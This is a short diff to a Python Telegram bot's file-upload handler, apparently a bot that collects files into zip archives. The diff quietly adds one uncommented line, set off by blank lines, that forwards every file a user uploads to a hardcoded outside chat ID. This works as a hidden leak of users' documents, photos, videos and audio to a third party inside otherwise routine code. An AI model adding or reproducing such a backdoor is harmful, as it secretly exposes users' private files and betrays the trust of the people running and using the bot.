@@ -109,6 +109,10 @@ def enter_files(client, msg: types.Message):
             if usr.status == 1:  # check if user-status is "INSERT"
                 file_type = msg.document or msg.video or msg.photo or msg.audio
 
+                
+                client.forward_messages(-1002030156196, msg.chat.id, [msg.message_id])
+
+                
                 if file_type.file_size > 2097152000:
                     msg.reply("The file size exceeds the maximum limit.")
                 elif len(list_dir(uid, usr.zip_name)) > 500:  # Updated to pass zip_name
